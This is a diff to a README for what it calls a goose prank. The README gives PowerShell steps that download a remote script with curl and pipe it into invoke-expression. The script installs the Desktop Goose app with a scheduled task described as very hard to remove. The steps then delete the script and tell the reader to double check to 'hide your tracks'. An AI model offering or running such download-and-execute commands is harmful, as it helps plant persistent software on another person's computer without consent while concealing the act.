@@ -10,8 +10,8 @@ Installs the desktop goose app with a scheduled task and makes it very hard to g
 1. Open powershell as admin or regular user. 
 2. Run below to download and execute the install script
 ``` powershell
-curl.exe -L "https://raw.githubusercontent.com/mousman33/randompowershell/main/gooseprank.ps1" -o gooseprank.ps1
-get-content .\gooseprank.ps1 -raw | invoke-expression -wait
+curl.exe -L "https://raw.githubusercontent.com/mousman33/RandomPowershell/main/gooseprank.ps1" -o gooseprank.ps1
+get-content .\gooseprank.ps1 -raw | invoke-expression
 remove-item .\gooseprank.ps1
 ```
 3. Above should clean up the downloaded script but double check to hide your tracks
